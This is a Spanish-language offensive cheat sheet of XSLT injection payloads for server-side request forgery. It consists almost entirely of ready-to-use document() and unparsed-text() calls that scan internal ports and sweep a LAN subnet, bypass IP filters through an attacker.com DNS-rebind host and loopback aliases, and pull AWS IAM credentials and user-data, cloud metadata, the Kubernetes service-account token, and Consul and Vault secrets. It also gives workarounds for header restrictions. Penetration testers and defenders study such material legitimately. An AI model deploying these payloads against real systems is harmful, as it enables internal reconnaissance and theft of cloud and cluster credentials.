---
aliases:
  - XSLT SSRF
  - XSLT document HTTP
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - vuln/ssrf
  - technique/discovery
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
  - '[[Server-Side Request Forgery (SSRF)]]'
---
# XSLT - SSRF

***

## Escaneo de Puertos Internos

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Localhost — SSH probe | `<xsl:copy-of select="document('http://127.0.0.1:22/')"/>` | Banner SSH si responde. |
| Localhost — Redis | `<xsl:copy-of select="document('http://127.0.0.1:6379/info')"/>` | Redis sin auth — info devuelve config. |
| Localhost — ElasticSearch | `<xsl:copy-of select="document('http://127.0.0.1:9200/_cluster/state')"/>` | ES sin auth — cluster state completo. |
| Localhost — admin panel | `<xsl:copy-of select="document('http://127.0.0.1:8080/admin')"/>` | Panel interno (Spring Actuator, Tomcat manager). |
| Localhost — MongoDB | `<xsl:copy-of select="document('http://127.0.0.1:27017/')"/>` | Mongo HTTP interface si habilitada. |
| Boolean port detect | `<xsl:choose><xsl:when test="document('http://127.0.0.1:8080/')">OPEN</xsl:when><xsl:otherwise>CLOSED</xsl:otherwise></xsl:choose>` | Marker en response → puerto abierto. |
| Loop port scan | `<xsl:for-each select="(80,443,8080,8443,3000,5000,9090)"><xsl:variable name="p" select="."/><xsl:if test="document(concat('http://127.0.0.1:', $p, '/'))"><port><xsl:value-of select="$p"/></port></xsl:if></xsl:for-each>` | Iterador over puertos comunes (XSLT 2.0+). |
| LAN sweep | `<xsl:for-each select="1 to 254"><xsl:variable name="ip" select="concat('10.0.0.', .)"/><xsl:if test="document(concat('http://', $ip, ':22/'))"><host><xsl:value-of select="$ip"/></host></xsl:if></xsl:for-each>` | Sweep /24 — costoso pero efectivo. |
| Bypass IP filter | `<xsl:copy-of select="document('http://target.attacker.com/')"/>` | DNS rebind dinámico. |
| Bypass via 0.0.0.0 | `<xsl:copy-of select="document('http://0.0.0.0:6379/')"/>` | Equivalente a 127.0.0.1. |
| Bypass IPv6 | `<xsl:copy-of select="document('http://[::1]:6379/')"/>` | IPv6 loopback. |
^xslt-ssrf-portscan

___

## Cloud Metadata e Internos

| **Objetivo** | **Payload** | **Target** |
|:---:|:---:|:---:|
| AWS — IAM creds | `<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>` | Lista roles, luego pedir creds del role. |
| AWS — full meta | `<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>` | Tree completo: hostname, mac, security-groups. |
| AWS — userdata | `<xsl:copy-of select="document('http://169.254.169.254/latest/user-data/')"/>` | Scripts cloud-init (creds en plaintext). |
| Azure — instance | `<xsl:copy-of select="document('http://169.254.169.254/metadata/instance?api-version=2021-02-01')"/>` | Requiere header `Metadata: true` — XSLT no manda headers custom (limitación). |
| GCP — metadata | `<xsl:copy-of select="document('http://metadata.google.internal/computeMetadata/v1/')"/>` | Requiere header `Metadata-Flavor: Google` — limitación igual. |
| DigitalOcean | `<xsl:copy-of select="document('http://169.254.169.254/metadata/v1/')"/>` | Sin headers requeridos. |
| Alibaba | `<xsl:copy-of select="document('http://100.100.100.200/latest/meta-data/')"/>` | IP distinta. |
| Kubernetes API | `<xsl:copy-of select="document('https://kubernetes.default.svc/api/v1/namespaces/default/pods')"/>` | Requiere token — combinar con file read del SA token. |
| Kube SA token | `<xsl:value-of select="unparsed-text('file:///var/run/secrets/kubernetes.io/serviceaccount/token')"/>` | Lee el token, después usarlo manualmente. |
| Consul agent | `<xsl:copy-of select="document('http://127.0.0.1:8500/v1/kv/?recurse')"/>` | KV store completo. |
| Vault unsealed | `<xsl:copy-of select="document('http://127.0.0.1:8200/v1/secret/data/app')"/>` | Sin auth si unsealed sin policies. |
^xslt-ssrf-cloud

### Limitación de headers

XSLT `document()` y `unparsed-text()` **no permiten setear headers HTTP custom**. Esto bloquea:
- Azure / GCP metadata (requieren `Metadata: true` / `Metadata-Flavor: Google`).
- AWS IMDSv2 (requiere token con `X-aws-ec2-metadata-token`).
- APIs internas con `Authorization: Bearer ...`.

Workaround: leer credenciales/tokens desde filesystem (kube SA token, instance role files) y usarlos via OOB chain o reportar como findings.

***
